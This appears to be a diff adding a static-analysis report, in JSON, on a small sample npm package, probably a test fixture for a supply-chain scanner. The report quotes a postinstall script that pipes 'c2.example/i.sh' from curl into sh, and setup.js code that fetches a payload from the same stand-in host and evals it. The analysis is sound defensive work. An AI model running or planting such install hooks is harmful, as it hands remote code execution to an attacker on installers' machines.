@@ -1,0 +1,1275 @@
+{
+  "header": {
+    "schema": 2,
+    "engine": "forge-analysis 0.0.1",
+    "catalog_sha256": "661ff253d0997c290715b16d7de935041072e290e1efd30a82fa0c75eed0949b",
+    "snapshot_sha256": "21640997110fe94a814caf659f927b541631e8a6969533c39f962f6461898070",
+    "mode": "static_only",
+    "scope": "quick"
+  },
+  "index": [
+    {
+      "section": "overview",
+      "number": 1,
+      "title": "Overview",
+      "explanation": "What was analysed, whether the picture is complete, and one count for everything we could not see.",
+      "count": null,
+      "anchor": "overview"
+    },
+    {
+      "section": "entry_points",
+      "number": 2,
+      "title": "Entry points",
+      "explanation": "What runs first: runtime and install entry files, and declared entries that do not match any analysed file.",
+      "count": 2,
+      "anchor": "entry-points"
+    },
+    {
+      "section": "timeline",
+      "number": 3,
+      "title": "Execution timeline",
+      "explanation": "When code runs: which functions run immediately, later, repeatedly, on events, at exit or at install, and every timer.",
+      "count": 5,
+      "anchor": "execution-timeline"
+    },
+    {
+      "section": "effects",
+      "number": 4,
+      "title": "Effects",
+      "explanation": "What the code does to the outside world: files, network, processes, environment and loading of code, each with its location.",
+      "count": 4,
+      "anchor": "effects"
+    },
+    {
+      "section": "flows",
+      "number": 5,
+      "title": "Data flows",
+      "explanation": "Data from the network or a file that can reach code execution or a command, from where it enters to where it is used.",
+      "count": 1,
+      "anchor": "data-flows"
+    },
+    {
+      "section": "scripts",
+      "number": 6,
+      "title": "Install scripts and shell commands",
+      "explanation": "Every package.json script, when it runs, and the commands inside it that we could not follow.",
+      "count": 2,
+      "anchor": "install-scripts-and-shell-commands"
+    },
+    {
+      "section": "dependencies",
+      "number": 7,
+      "title": "Dependencies",
+      "explanation": "Every declared dependency with where its code comes from: registry, git, URL, local path or bundled.",
+      "count": 4,
+      "anchor": "dependencies"
+    },
+    {
+      "section": "unresolved",
+      "number": 8,
+      "title": "Unresolved",
+      "explanation": "Places where static analysis cannot say what happens (computed code, dynamic loads, shell commands). Each one hides behaviour.",
+      "count": 3,
+      "anchor": "unresolved"
+    },
+    {
+      "section": "unlinked",
+      "number": 9,
+      "title": "Unlinked imports",
+      "explanation": "Imports we could not follow to their source: packages, missing files and names that are not exported.",
+      "count": 0,
+      "anchor": "unlinked-imports"
+    },
+    {
+      "section": "not_analysed",
+      "number": 10,
+      "title": "Not analysed",
+      "explanation": "Files and folders that were not read as code, by kind, and anything skipped by a limit.",
+      "count": 5,
+      "anchor": "not-analysed"
+    },
+    {
+      "section": "functions",
+      "number": 11,
+      "title": "Function index",
+      "explanation": "Every function with its lanes, effects, callers and the facts inside it.",
+      "count": 4,
+      "anchor": "function-index"
+    }
+  ],
+  "overview": {
+    "files_analysed": 1,
+    "files_not_analysed": 5,
+    "functions": 4,
+    "facts": 21,
+    "links_made": 0,
+    "unresolved_cleared_by_links": 0,
+    "completeness": "incomplete",
+    "coverage": [
+      {
+        "section": "unresolved",
+        "label": "places where static analysis cannot say what happens",
+        "count": 3
+      },
+      {
+        "section": "unlinked",
+        "label": "imports not followed to their source",
+        "count": 0
+      },
+      {
+        "section": "entry_points",
+        "label": "declared entry points that match no analysed file",
+        "count": 0
+      },
+      {
+        "section": "not_analysed",
+        "label": "files or folders not read as code",
+        "count": 5
+      },
+      {
+        "section": "dependencies",
+        "label": "dependencies whose own code and install scripts were not analysed",
+        "count": 3
+      },
+      {
+        "section": "functions",
+        "label": "calls whose target we could not see (no function followed, no fact)",
+        "count": 3
+      }
+    ],
+    "fact_counts": [
+      {
+        "kind": "entry",
+        "count": 0
+      },
+      {
+        "kind": "import",
+        "count": 1
+      },
+      {
+        "kind": "call",
+        "count": 5
+      },
+      {
+        "kind": "effect",
+        "count": 4
+      },
+      {
+        "kind": "timer",
+        "count": 1
+      },
+      {
+        "kind": "lifecycle_script",
+        "count": 2
+      },
+      {
+        "kind": "dependency",
+        "count": 4
+      },
+      {
+        "kind": "unresolved",
+        "count": 3
+      },
+      {
+        "kind": "flow",
+        "count": 1
+      }
+    ],
+    "mirrored_output": [],
+    "unreached_functions": 0
+  },
+  "entry_points": {
+    "basis": "roots",
+    "runtime": [
+      {
+        "text": "setup.js",
+        "truncated": false,
+        "original_len": 8,
+        "sha256": "a38349e26cd88bc390da3dd2ce99890c25f651f5af8edd9e95a77577032ce9c1"
+      }
+    ],
+    "install": [
+      {
+        "text": "setup.js",
+        "truncated": false,
+        "original_len": 8,
+        "sha256": "a38349e26cd88bc390da3dd2ce99890c25f651f5af8edd9e95a77577032ce9c1"
+      }
+    ],
+    "issues": []
+  },
+  "timeline": {
+    "lanes": [
+      {
+        "lane": "immediate",
+        "functions": [
+          {
+            "file": {
+              "text": "setup.js",
+              "truncated": false,
+              "original_len": 8,
+              "sha256": "a38349e26cd88bc390da3dd2ce99890c25f651f5af8edd9e95a77577032ce9c1"
+            },
+            "func": 0,
+            "name": null,
+            "line": 1
+          },
+          {
+            "file": {
+              "text": "setup.js",
+              "truncated": false,
+              "original_len": 8,
+              "sha256": "a38349e26cd88bc390da3dd2ce99890c25f651f5af8edd9e95a77577032ce9c1"
+            },
+            "func": 1,
+            "name": null,
+            "line": 3
+          },
+          {
+            "file": {
+              "text": "setup.js",
+              "truncated": false,
+              "original_len": 8,
+              "sha256": "a38349e26cd88bc390da3dd2ce99890c25f651f5af8edd9e95a77577032ce9c1"
+            },
+            "func": 2,
+            "name": null,
+            "line": 3
+          }
+        ]
+      },
+      {
+        "lane": "recurring",
+        "functions": [
+          {
+            "file": {
+              "text": "setup.js",
+              "truncated": false,
+              "original_len": 8,
+              "sha256": "a38349e26cd88bc390da3dd2ce99890c25f651f5af8edd9e95a77577032ce9c1"
+            },
+            "func": 3,
+            "name": null,
+            "line": 4
+          }
+        ]
+      },
+      {
+        "lane": "install",
+        "functions": [
+          {
+            "file": {
+              "text": "setup.js",
+              "truncated": false,
+              "original_len": 8,
+              "sha256": "a38349e26cd88bc390da3dd2ce99890c25f651f5af8edd9e95a77577032ce9c1"
+            },
+            "func": 0,
+            "name": null,
+            "line": 1
+          },
+          {
+            "file": {
+              "text": "setup.js",
+              "truncated": false,
+              "original_len": 8,
+              "sha256": "a38349e26cd88bc390da3dd2ce99890c25f651f5af8edd9e95a77577032ce9c1"
+            },
+            "func": 1,
+            "name": null,
+            "line": 3
+          },
+          {
+            "file": {
+              "text": "setup.js",
+              "truncated": false,
+              "original_len": 8,
+              "sha256": "a38349e26cd88bc390da3dd2ce99890c25f651f5af8edd9e95a77577032ce9c1"
+            },
+            "func": 2,
+            "name": null,
+            "line": 3
+          }
+        ]
+      }
+    ],
+    "timers": [
+      {
+        "id": "fact:38c761f4499498f8",
+        "at": {
+          "file": {
+            "text": "setup.js",
+            "truncated": false,
+            "original_len": 8,
+            "sha256": "a38349e26cd88bc390da3dd2ce99890c25f651f5af8edd9e95a77577032ce9c1"
+          },
+          "start_line": 4,
+          "end_line": 4,
+          "start_byte": 152,
+          "end_byte": 216
+        },
+        "detail": {
+          "text": "setInterval",
+          "truncated": false,
+          "original_len": 11,
+          "sha256": "23a130e145c7a02c00d230807bbd3323ce6a24fa8eb83f0d608b2f886118939f"
+        },
+        "timing": {
+          "lane": "recurring",
+          "delay_ms": {
+            "known": 5000
+          },
+          "cleared": false
+        },
+        "in_fn": {
+          "file": {
+            "text": "setup.js",
+            "truncated": false,
+            "original_len": 8,
+            "sha256": "a38349e26cd88bc390da3dd2ce99890c25f651f5af8edd9e95a77577032ce9c1"
+          },
+          "func": 0,
+          "name": null,
+          "line": 1
+        },
+        "lanes": [
+          "immediate",
+          "install"
+        ],
+        "reachable": true
+      }
+    ]
+  },
+  "effects": [
+    {
+      "effect": "code_load",
+      "items": [
+        {
+          "id": "fact:1d5d4970d0d178f7",
+          "at": {
+            "file": {
+              "text": "setup.js",
+              "truncated": false,
+              "original_len": 8,
+              "sha256": "a38349e26cd88bc390da3dd2ce99890c25f651f5af8edd9e95a77577032ce9c1"
+            },
+            "start_line": 3,
+            "end_line": 3,
+            "start_byte": 142,
+            "end_byte": 149
+          },
+          "detail": null,
+          "url": null,
+          "in_fn": {
+            "file": {
+              "text": "setup.js",
+              "truncated": false,
+              "original_len": 8,
+              "sha256": "a38349e26cd88bc390da3dd2ce99890c25f651f5af8edd9e95a77577032ce9c1"
+            },
+            "func": 2,
+            "name": null,
+            "line": 3
+          },
+          "lanes": [
+            "immediate",
+            "install"
+          ],
+          "reachable": true
+        }
+      ]
+    },
+    {
+      "effect": "fs_delete",
+      "items": [
+        {
+          "id": "fact:7f1a8d20d9216e55",
+          "at": {
+            "file": {
+              "text": "setup.js",
+              "truncated": false,
+              "original_len": 8,
+              "sha256": "a38349e26cd88bc390da3dd2ce99890c25f651f5af8edd9e95a77577032ce9c1"
+            },
+            "start_line": 2,
+            "end_line": 2,
+            "start_byte": 26,
+            "end_byte": 70
+          },
+          "detail": {
+            "text": "/tmp/cache",
+            "truncated": false,
+            "original_len": 10,
+            "sha256": "e418a99c7e5b11d0448d21559c4fe6372217001bc931288d8bf39bee0a2932b3"
+          },
+          "url": null,
+          "in_fn": {
+            "file": {
+              "text": "setup.js",
+              "truncated": false,
+              "original_len": 8,
+              "sha256": "a38349e26cd88bc390da3dd2ce99890c25f651f5af8edd9e95a77577032ce9c1"
+            },
+            "func": 0,
+            "name": null,
+            "line": 1
+          },
+          "lanes": [
+            "immediate",
+            "install"
+          ],
+          "reachable": true
+        }
+      ]
+    },
+    {
+      "effect": "net_out",
+      "items": [
+        {
+          "id": "fact:4b45608f3cf8d81e",
+          "at": {
+            "file": {
+              "text": "setup.js",
+              "truncated": false,
+              "original_len": 8,
+              "sha256": "a38349e26cd88bc390da3dd2ce99890c25f651f5af8edd9e95a77577032ce9c1"
+            },
+            "start_line": 3,
+            "end_line": 3,
+            "start_byte": 72,
+            "end_byte": 107
+          },
+          "detail": {
+            "text": "https://c2.example/payload",
+            "truncated": false,
+            "original_len": 26,
+            "sha256": "af4b8c6cb93bb00d7ea9766c9ec2bff242d75dd231777ad66d351ef99a97f463"
+          },
+          "url": null,
+          "in_fn": {
+            "file": {
+              "text": "setup.js",
+              "truncated": false,
+              "original_len": 8,
+              "sha256": "a38349e26cd88bc390da3dd2ce99890c25f651f5af8edd9e95a77577032ce9c1"
+            },
+            "func": 0,
+            "name": null,
+            "line": 1
+          },
+          "lanes": [
+            "immediate",
+            "install"
+          ],
+          "reachable": true
+        }
+      ]
+    },
+    {
+      "effect": "fs_write",
+      "items": [
+        {
+          "id": "fact:0ab78a27a5c9fe51",
+          "at": {
+            "file": {
+              "text": "setup.js",
+              "truncated": false,
+              "original_len": 8,
+              "sha256": "a38349e26cd88bc390da3dd2ce99890c25f651f5af8edd9e95a77577032ce9c1"
+            },
+            "start_line": 4,
+            "end_line": 4,
+            "start_byte": 172,
+            "end_byte": 206
+          },
+          "detail": {
+            "text": "/tmp/beat",
+            "truncated": false,
+            "original_len": 9,
+            "sha256": "7e427f8cfa614171c5f632fd3139a499e92fdc6a235ac23903a20579fc535862"
+          },
+          "url": null,
+          "in_fn": {
+            "file": {
+              "text": "setup.js",
+              "truncated": false,
+              "original_len": 8,
+              "sha256": "a38349e26cd88bc390da3dd2ce99890c25f651f5af8edd9e95a77577032ce9c1"
+            },
+            "func": 3,
+            "name": null,
+            "line": 4
+          },
+          "lanes": [
+            "recurring"
+          ],
+          "reachable": true
+        }
+      ]
+    }
+  ],
+  "flows": [
+    {
+      "id": "fact:68df2048122e2fe3",
+      "sink": "code",
+      "at": {
+        "file": {
+          "text": "setup.js",
+          "truncated": false,
+          "original_len": 8,
+          "sha256": "a38349e26cd88bc390da3dd2ce99890c25f651f5af8edd9e95a77577032ce9c1"
+        },
+        "start_line": 3,
+        "end_line": 3,
+        "start_byte": 142,
+        "end_byte": 149
+      },
+      "origin": {
+        "file": {
+          "text": "setup.js",
+          "truncated": false,
+          "original_len": 8,
+          "sha256": "a38349e26cd88bc390da3dd2ce99890c25f651f5af8edd9e95a77577032ce9c1"
+        },
+        "start_line": 3,
+        "end_line": 3,
+        "start_byte": 72,
+        "end_byte": 107
+      },
+      "detail": {
+        "text": "fetch('https://c2.example/payload')",
+        "truncated": false,
+        "original_len": 35,
+        "sha256": "b3dda47f8fc852b76749294c23c7effcad08ebff5fdc7e63bddcd2c231425a03"
+      },
+      "in_fn": {
+        "file": {
+          "text": "setup.js",
+          "truncated": false,
+          "original_len": 8,
+          "sha256": "a38349e26cd88bc390da3dd2ce99890c25f651f5af8edd9e95a77577032ce9c1"
+        },
+        "func": 2,
+        "name": null,
+        "line": 3
+      },
+      "lanes": [
+        "immediate",
+        "install"
+      ],
+      "reachable": true
+    }
+  ],
+  "scripts": [
+    {
+      "id": "fact:37a57016ca87a6a1",
+      "at": {
+        "file": {
+          "text": "package.json",
+          "truncated": false,
+          "original_len": 12,
+          "sha256": "7ae45ad102eab3b6d7e7896acd08c427a9b25b346470d7bc6507b6481575d519"
+        },
+        "start_line": 6,
+        "end_line": 6,
+        "start_byte": 106,
+        "end_byte": 161
+      },
+      "name": {
+        "text": "postinstall",
+        "truncated": false,
+        "original_len": 11,
+        "sha256": "b7bed52642190d60236c5c1670142b732793f371fbc6e1cc3d3070c6e43420a1"
+      },
+      "trigger": "install",
+      "command": {
+        "text": "node setup.js && curl -s https://c2.example/i.sh | sh",
+        "truncated": false,
+        "original_len": 53,
+        "sha256": "1103b01aeebdea6acb7978a7c6183cc84dc7516a2578416b129665d91ab4662c"
+      },
+      "unfollowed": [
+        {
+          "text": "curl",
+          "truncated": false,
+          "original_len": 4,
+          "sha256": "427e4b79b1f0fc90306cbe064b1297b21dc6835bfa656d3bf46bc156e3f24bb0"
+        },
+        {
+          "text": "sh",
+          "truncated": false,
+          "original_len": 2,
+          "sha256": "89c4ec9f6b3f1086b158d8ef03dfe8155e6f79d9e66434b8f9b3432fe8720e50"
+        }
+      ]
+    },
+    {
+      "id": "fact:b6f15d5cc2796fff",
+      "at": {
+        "file": {
+          "text": "package.json",
+          "truncated": false,
+          "original_len": 12,
+          "sha256": "7ae45ad102eab3b6d7e7896acd08c427a9b25b346470d7bc6507b6481575d519"
+        },
+        "start_line": 7,
+        "end_line": 7,
+        "start_byte": 175,
+        "end_byte": 189
+      },
+      "name": {
+        "text": "test",
+        "truncated": false,
+        "original_len": 4,
+        "sha256": "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08"
+      },
+      "trigger": "manual",
+      "command": {
+        "text": "node test.js",
+        "truncated": false,
+        "original_len": 12,
+        "sha256": "6e0552fabe7ade4b89857ce4908c5fe4f8d2ac7560bcb1b3e986a1673e0e0c3d"
+      },
+      "unfollowed": []
+    }
+  ],
+  "dependencies": [
+    {
+      "id": "fact:3129d0d30e6c3cc4",
+      "at": {
+        "file": {
+          "text": "package.json",
+          "truncated": false,
+          "original_len": 12,
+          "sha256": "7ae45ad102eab3b6d7e7896acd08c427a9b25b346470d7bc6507b6481575d519"
+        },
+        "start_line": 11,
+        "end_line": 11,
+        "start_byte": 253,
+        "end_byte": 274
+      },
+      "name": {
+        "text": "evil",
+        "truncated": false,
+        "original_len": 4,
+        "sha256": "b5c1fb2efc6d6b4674c2fdcc48ce01b43a3b7c03763c0c3355de0099ee0f8c73"
+      },
+      "info": {
+        "section": "dependencies",
+        "spec": {
+          "text": "github:someone/evil",
+          "truncated": false,
+          "original_len": 19,
+          "sha256": "c841c588a4d8a0ebcf986841413f694a77050328e14551ad3980e72e19bb7617"
+        },
+        "source": "git"
+      }
+    },
+    {
+      "id": "fact:09c830f4d9edc277",
+      "at": {
+        "file": {
+          "text": "package.json",
+          "truncated": false,
+          "original_len": 12,
+          "sha256": "7ae45ad102eab3b6d7e7896acd08c427a9b25b346470d7bc6507b6481575d519"
+        },
+        "start_line": 10,
+        "end_line": 10,
+        "start_byte": 231,
+        "end_byte": 239
+      },
+      "name": {
+        "text": "left-pad",
+        "truncated": false,
+        "original_len": 8,
+        "sha256": "0cc8ed26e04976bca87d2617e4c0c481592eb2b11129405cad059ba263fe3250"
+      },
+      "info": {
+        "section": "dependencies",
+        "spec": {
+          "text": "^1.0.0",
+          "truncated": false,
+          "original_len": 6,
+          "sha256": "2e2b96c20e5ca1e1f85e910f703fa3526c0c1b0749c31f15d9c08af87eeed4f4"
+        },
+        "source": "registry"
+      }
+    },
+    {
+      "id": "fact:c7e2792f0c29c240",
+      "at": {
+        "file": {
+          "text": "package.json",
+          "truncated": false,
+          "original_len": 12,
+          "sha256": "7ae45ad102eab3b6d7e7896acd08c427a9b25b346470d7bc6507b6481575d519"
+        },
+        "start_line": 12,
+        "end_line": 12,
+        "start_byte": 289,
+        "end_byte": 304
+      },
+      "name": {
+        "text": "local",
+        "truncated": false,
+        "original_len": 5,
+        "sha256": "25bf8e1a2393f1108d37029b3df5593236c755742ec93465bbafa9b290bddcf6"
+      },
+      "info": {
+        "section": "dependencies",
+        "spec": {
+          "text": "file:../local",
+          "truncated": false,
+          "original_len": 13,
+          "sha256": "c9a196e995b5918e58081d5a4205b25b29aeae48769c8549246773b7c16a35fb"
+        },
+        "source": "local_path"
+      }
+    },
+    {
+      "id": "fact:6f54974193f61141",
+      "at": {
+        "file": {
+          "text": "package.json",
+          "truncated": false,
+          "original_len": 12,
+          "sha256": "7ae45ad102eab3b6d7e7896acd08c427a9b25b346470d7bc6507b6481575d519"
+        },
+        "start_line": 15,
+        "end_line": 15,
+        "start_byte": 345,
+        "end_byte": 352
+      },
+      "name": {
+        "text": "tool",
+        "truncated": false,
+        "original_len": 4,
+        "sha256": "7c9bbe5ec9b3fb774e8fa0f54247e93c34ddf8e5d16fe3073420de0ae81a262d"
+      },
+      "info": {
+        "section": "dev",
+        "spec": {
+          "text": "1.2.3",
+          "truncated": false,
+          "original_len": 5,
+          "sha256": "c47f5b18b8a430e698b9fe15e51f6119984e78334bcf3f45e210d30c37ef2f9e"
+        },
+        "source": "registry"
+      }
+    }
+  ],
+  "unresolved": [
+    {
+      "reason": "eval",
+      "items": [
+        {
+          "id": "fact:909a5c4ffb95808e",
+          "at": {
+            "file": {
+              "text": "setup.js",
+              "truncated": false,
+              "original_len": 8,
+              "sha256": "a38349e26cd88bc390da3dd2ce99890c25f651f5af8edd9e95a77577032ce9c1"
+            },
+            "start_line": 3,
+            "end_line": 3,
+            "start_byte": 147,
+            "end_byte": 148
+          },
+          "detail": {
+            "text": "t",
+            "truncated": false,
+            "original_len": 1,
+            "sha256": "e3b98a4da31a127d4bde6e43033f66ba274cab0eb7eb1c70ec41402bf6273dd8"
+          },
+          "in_fn": {
+            "file": {
+              "text": "setup.js",
+              "truncated": false,
+              "original_len": 8,
+              "sha256": "a38349e26cd88bc390da3dd2ce99890c25f651f5af8edd9e95a77577032ce9c1"
+            },
+            "func": 2,
+            "name": null,
+            "line": 3
+          },
+          "lanes": [
+            "immediate",
+            "install"
+          ],
+          "reachable": true
+        }
+      ]
+    },
+    {
+      "reason": "shell_command",
+      "items": [
+        {
+          "id": "fact:22b14d8ac971c696",
+          "at": {
+            "file": {
+              "text": "package.json",
+              "truncated": false,
+              "original_len": 12,
+              "sha256": "7ae45ad102eab3b6d7e7896acd08c427a9b25b346470d7bc6507b6481575d519"
+            },
+            "start_line": 6,
+            "end_line": 6,
+            "start_byte": 106,
+            "end_byte": 161
+          },
+          "detail": {
+            "text": "curl",
+            "truncated": false,
+            "original_len": 4,
+            "sha256": "427e4b79b1f0fc90306cbe064b1297b21dc6835bfa656d3bf46bc156e3f24bb0"
+          },
+          "in_fn": null,
+          "lanes": [],
+          "reachable": null
+        },
+        {
+          "id": "fact:a1b8359b7d26df32",
+          "at": {
+            "file": {
+              "text": "package.json",
+              "truncated": false,
+              "original_len": 12,
+              "sha256": "7ae45ad102eab3b6d7e7896acd08c427a9b25b346470d7bc6507b6481575d519"
+            },
+            "start_line": 6,
+            "end_line": 6,
+            "start_byte": 106,
+            "end_byte": 161
+          },
+          "detail": {
+            "text": "sh",
+            "truncated": false,
+            "original_len": 2,
+            "sha256": "89c4ec9f6b3f1086b158d8ef03dfe8155e6f79d9e66434b8f9b3432fe8720e50"
+          },
+          "in_fn": null,
+          "lanes": [],
+          "reachable": null
+        }
+      ]
+    }
+  ],
+  "unlinked": [],
+  "package_calls": [],
+  "not_analysed": {
+    "groups": [
+      {
+        "kind": "npm_config",
+        "items": [
+          {
+            "path": {
+              "text": ".npmrc",
+              "truncated": false,
+              "original_len": 6,
+              "sha256": "e813096d69c49812e40e00be9ac8fa14d77f0ec1f97ab4c45cb096b3bedd35de"
+            },
+            "size": 35,
+            "kind": "npm_config"
+          }
+        ]
+      },
+      {
+        "kind": "shell_script",
+        "items": [
+          {
+            "path": {
+              "text": "run.sh",
+              "truncated": false,
+              "original_len": 6,
+              "sha256": "d31ce0453051853c17ba2a5225b3d1bfab548e095bab0967d6acfd1b3ce1b35d"
+            },
+            "size": 18,
+            "kind": "shell_script"
+          }
+        ]
+      },
+      {
+        "kind": "other_file",
+        "items": [
+          {
+            "path": {
+              "text": "data.json",
+              "truncated": false,
+              "original_len": 9,
+              "sha256": "99377c63fbe5425d01e6e128d8b6a4a9b3f2e18bb233155583875b8a65aef58f"
+            },
+            "size": 9,
+            "kind": "other_file"
+          }
+        ]
+      },
+      {
+        "kind": "out_of_scope",
+        "items": [
+          {
+            "path": {
+              "text": "lib.js",
+              "truncated": false,
+              "original_len": 6,
+              "sha256": "4d4d0cea7e443590b59dddca4fc34faa6f37fbfd94a251d8d0047b8aa8ca19ee"
+            },
+            "size": 46,
+            "kind": "out_of_scope"
+          },
+          {
+            "path": {
+              "text": "test.js",
+              "truncated": false,
+              "original_len": 7,
+              "sha256": "13876b4beb64b9f156474dc78f9c923952a7ca210d4507b6b3135bbe244f8a60"
+            },
+            "size": 18,
+            "kind": "out_of_scope"
+          }
+        ]
+      }
+    ],
+    "unrecorded": 0
+  },
+  "functions": {
+    "functions": [
+      {
+        "at": {
+          "file": {
+            "text": "setup.js",
+            "truncated": false,
+            "original_len": 8,
+            "sha256": "a38349e26cd88bc390da3dd2ce99890c25f651f5af8edd9e95a77577032ce9c1"
+          },
+          "start_line": 1,
+          "end_line": 4,
+          "start_byte": 0,
+          "end_byte": 218
+        },
+        "file": {
+          "text": "setup.js",
+          "truncated": false,
+          "original_len": 8,
+          "sha256": "a38349e26cd88bc390da3dd2ce99890c25f651f5af8edd9e95a77577032ce9c1"
+        },
+        "func": 0,
+        "name": null,
+        "lanes": [
+          "immediate",
+          "install"
+        ],
+        "reachable_from_entry": true,
+        "escapes": false,
+        "direct_effects": [
+          {
+            "effect": "fs_delete",
+            "fact": "fact:7f1a8d20d9216e55"
+          },
+          {
+            "effect": "net_out",
+            "fact": "fact:4b45608f3cf8d81e"
+          }
+        ],
+        "transitive_effects": [
+          "fs_write",
+          "fs_delete",
+          "net_out",
+          "code_load"
+        ],
+        "unresolved": [],
+        "unfollowed_calls": 6,
+        "calls_followed_across_files": 0,
+        "calls_matched_to_a_fact": 4,
+        "calls_not_traced": 2,
+        "untraced_calls": [
+          {
+            "callee": {
+              "text": "(..).then",
+              "truncated": false,
+              "original_len": 9,
+              "sha256": "3397a2abdad2e6554789e2418e4708a38ec497b4b32f5c45d4acd8928c237a0c"
+            },
+            "line": 3,
+            "start_byte": 72,
+            "end_byte": 150
+          },
+          {
+            "callee": {
+              "text": "(..).then",
+              "truncated": false,
+              "original_len": 9,
+              "sha256": "3397a2abdad2e6554789e2418e4708a38ec497b4b32f5c45d4acd8928c237a0c"
+            },
+            "line": 3,
+            "start_byte": 72,
+            "end_byte": 129
+          }
+        ],
+        "calls_into_packages": [],
+        "calls": [],
+        "callbacks": [
+          1,
+          2,
+          3
+        ],
+        "called_from": [],
+        "followed_calls": [],
+        "followed_called_from": [],
+        "facts": [
+          "fact:c84dfdaf5bf34872",
+          "fact:056fe7f3c71e6b50",
+          "fact:7f1a8d20d9216e55",
+          "fact:4cc140adbcc4fc13",
+          "fact:4b45608f3cf8d81e",
+          "fact:8e90923ec4d7ab03",
+          "fact:38c761f4499498f8"
+        ]
+      },
+      {
+        "at": {
+          "file": {
+            "text": "setup.js",
+            "truncated": false,
+            "original_len": 8,
+            "sha256": "a38349e26cd88bc390da3dd2ce99890c25f651f5af8edd9e95a77577032ce9c1"
+          },
+          "start_line": 3,
+          "end_line": 3,
+          "start_byte": 113,
+          "end_byte": 128
+        },
+        "file": {
+          "text": "setup.js",
+          "truncated": false,
+          "original_len": 8,
+          "sha256": "a38349e26cd88bc390da3dd2ce99890c25f651f5af8edd9e95a77577032ce9c1"
+        },
+        "func": 1,
+        "name": null,
+        "lanes": [
+          "immediate",
+          "install"
+        ],
+        "reachable_from_entry": true,
+        "escapes": false,
+        "direct_effects": [],
+        "transitive_effects": [],
+        "unresolved": [],
+        "unfollowed_calls": 1,
+        "calls_followed_across_files": 0,
+        "calls_matched_to_a_fact": 0,
+        "calls_not_traced": 1,
+        "untraced_calls": [
+          {
+            "callee": {
+              "text": "r.text",
+              "truncated": false,
+              "original_len": 6,
+              "sha256": "79436b3f77f7226dff73766931cae06fcf9612be824bf3dee1f0fa796af1d146"
+            },
+            "line": 3,
+            "start_byte": 120,
+            "end_byte": 128
+          }
+        ],
+        "calls_into_packages": [],
+        "calls": [],
+        "callbacks": [],
+        "called_from": [
+          0
+        ],
+        "followed_calls": [],
+        "followed_called_from": [],
+        "facts": []
+      },
+      {
+        "at": {
+          "file": {
+            "text": "setup.js",
+            "truncated": false,
+            "original_len": 8,
+            "sha256": "a38349e26cd88bc390da3dd2ce99890c25f651f5af8edd9e95a77577032ce9c1"
+          },
+          "start_line": 3,
+          "end_line": 3,
+          "start_byte": 135,
+          "end_byte": 149
+        },
+        "file": {
+          "text": "setup.js",
+          "truncated": false,
+          "original_len": 8,
+          "sha256": "a38349e26cd88bc390da3dd2ce99890c25f651f5af8edd9e95a77577032ce9c1"
+        },
+        "func": 2,
+        "name": null,
+        "lanes": [
+          "immediate",
+          "install"
+        ],
+        "reachable_from_entry": true,
+        "escapes": false,
+        "direct_effects": [
+          {
+            "effect": "code_load",
+            "fact": "fact:1d5d4970d0d178f7"
+          }
+        ],
+        "transitive_effects": [
+          "code_load"
+        ],
+        "unresolved": [
+          "eval"
+        ],
+        "unfollowed_calls": 1,
+        "calls_followed_across_files": 0,
+        "calls_matched_to_a_fact": 1,
+        "calls_not_traced": 0,
+        "untraced_calls": [],
+        "calls_into_packages": [],
+        "calls": [],
+        "callbacks": [],
+        "called_from": [
+          0
+        ],
+        "followed_calls": [],
+        "followed_called_from": [],
+        "facts": [
+          "fact:4fb37decbb748c7f",
+          "fact:1d5d4970d0d178f7",
+          "fact:68df2048122e2fe3",
+          "fact:909a5c4ffb95808e"
+        ]
+      },
+      {
+        "at": {
+          "file": {
+            "text": "setup.js",
+            "truncated": false,
+            "original_len": 8,
+            "sha256": "a38349e26cd88bc390da3dd2ce99890c25f651f5af8edd9e95a77577032ce9c1"
+          },
+          "start_line": 4,
+          "end_line": 4,
+          "start_byte": 164,
+          "end_byte": 209
+        },
+        "file": {
+          "text": "setup.js",
+          "truncated": false,
+          "original_len": 8,
+          "sha256": "a38349e26cd88bc390da3dd2ce99890c25f651f5af8edd9e95a77577032ce9c1"
+        },
+        "func": 3,
+        "name": null,
+        "lanes": [
+          "recurring"
+        ],
+        "reachable_from_entry": true,
+        "escapes": false,
+        "direct_effects": [
+          {
+            "effect": "fs_write",
+            "fact": "fact:0ab78a27a5c9fe51"
+          }
+        ],
+        "transitive_effects": [
+          "fs_write"
+        ],
+        "unresolved": [],
+        "unfollowed_calls": 1,
+        "calls_followed_across_files": 0,
+        "calls_matched_to_a_fact": 1,
+        "calls_not_traced": 0,
+        "untraced_calls": [],
+        "calls_into_packages": [],
+        "calls": [],
+        "callbacks": [],
+        "called_from": [
+          0
+        ],
+        "followed_calls": [],
+        "followed_called_from": [],
+        "facts": [
+          "fact:0becde626b3a9a5a",
+          "fact:0ab78a27a5c9fe51"
+        ]
+      }
+    ],
+    "untraced_by_callee": [
+      {
+        "callee": {
+          "text": "(..).then",
+          "truncated": false,
+          "original_len": 9,
+          "sha256": "3397a2abdad2e6554789e2418e4708a38ec497b4b32f5c45d4acd8928c237a0c"
+        },
+        "count": 2,
+        "sites": [
+          {
+            "in_fn": {
+              "file": {
+                "text": "setup.js",
+                "truncated": false,
+                "original_len": 8,
+                "sha256": "a38349e26cd88bc390da3dd2ce99890c25f651f5af8edd9e95a77577032ce9c1"
+              },
+              "func": 0,
+              "name": null,
+              "line": 1
+            },
+            "line": 3,
+            "start_byte": 72,
+            "end_byte": 129
+          },
+          {
+            "in_fn": {
+              "file": {
+                "text": "setup.js",
+                "truncated": false,
+                "original_len": 8,
+                "sha256": "a38349e26cd88bc390da3dd2ce99890c25f651f5af8edd9e95a77577032ce9c1"
+              },
+              "func": 0,
+              "name": null,
+              "line": 1
+            },
+            "line": 3,
+            "start_byte": 72,
+            "end_byte": 150
+          }
+        ]
+      },
+      {
+        "callee": {
+          "text": "r.text",
+          "truncated": false,
+          "original_len": 6,
+          "sha256": "79436b3f77f7226dff73766931cae06fcf9612be824bf3dee1f0fa796af1d146"
+        },
+        "count": 1,
+        "sites": [
+          {
+            "in_fn": {
+              "file": {
+                "text": "setup.js",
+                "truncated": false,
+                "original_len": 8,
+                "sha256": "a38349e26cd88bc390da3dd2ce99890c25f651f5af8edd9e95a77577032ce9c1"
+              },
+              "func": 1,
+              "name": null,
+              "line": 3
+            },
+            "line": 3,
+            "start_byte": 120,
+            "end_byte": 128
+          }
+        ]
+      }
+    ],
+    "unplaced_facts": []
+  }
+}
